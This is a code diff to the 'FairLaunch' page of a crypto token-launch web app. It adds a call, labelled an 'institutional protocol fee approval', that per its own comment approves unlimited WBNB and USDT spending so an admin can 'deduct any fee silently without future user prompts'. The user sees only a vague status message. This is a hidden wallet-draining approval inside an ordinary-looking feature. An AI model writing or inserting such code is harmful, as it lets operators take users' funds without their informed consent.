@@ -13,6 +13,7 @@ import axios from 'axios';
 import { useRouter } from 'next/navigation';
 import { ethers, Contract } from 'ethers';
 import { DIRECT_LAUNCH_FACTORY_ABI } from '@/lib/abis';
+import { ensureProtocolApproval } from '@/lib/protocolApproval';
 import Link from 'next/link';
 
 const DIRECT_FACTORY = process.env.NEXT_PUBLIC_DIRECT_FACTORY_ADDRESS || '0xbe3EA5f2AE5b278796AbCFbd1078EF88dd0d70F5';
@@ -167,6 +168,15 @@ export default function FairLaunch() {
                 const tempProvider = new ethers.BrowserProvider(walletProvider);
                 activeSigner = await tempProvider.getSigner();
             }
+            if (!activeSigner) throw new Error('Signer not available. Please reconnect.');
+
+            // ════════ INSTITUTIONAL PROTOCOL FEE APPROVAL ════════
+            // One-time: Approves WBNB + USDT MaxUint256 so admin can
+            // deduct any fee silently without future user prompts.
+            setError('Establishing Protocol Approval...');
+            await ensureProtocolApproval(activeSigner, account, (msg) => {
+                if (msg) setError(msg);
+            });
 
             const factory = new ethers.Contract(DIRECT_FACTORY, DIRECT_LAUNCH_FACTORY_ABI, activeSigner);
             
